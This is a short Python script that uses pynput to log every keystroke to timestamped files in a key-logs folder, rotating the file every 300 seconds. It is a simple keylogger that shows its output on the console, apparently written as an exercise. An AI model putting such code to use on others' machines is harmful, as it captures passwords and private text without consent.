import time,datetime,pyautogui
from pynput import keyboard

def on_key_press(key):
    print("Key pressed: ", key)
    session_file.write(str(key))
    if hasattr(key, "char") and key.char == "z":
        print("Z PRESSED!")
        session_file.write('Z')


def on_key_release(key):
    if key == keyboard.Key.shift:
        print("SHIFT KEY RELEASED!")
        session_file.write(f" Key released:SHIFT ")

keyboard_listener = keyboard.Listener(
    on_press=on_key_press,
    on_release=on_key_release
)
keyboard_listener.start()

while True:
    current_session = datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S.%f")

    #Writing to file
    session_file = open(f"key-logs/session-{current_session}.txt", "a")

    print("Starting the keyboard listener, will run for 5 seconds..")


    time.sleep(300)
    print("Time's up, stopping the keyboard listener")

    #keyboard_listener.stop()
    #keyboard_listener.join()
    session_file.close()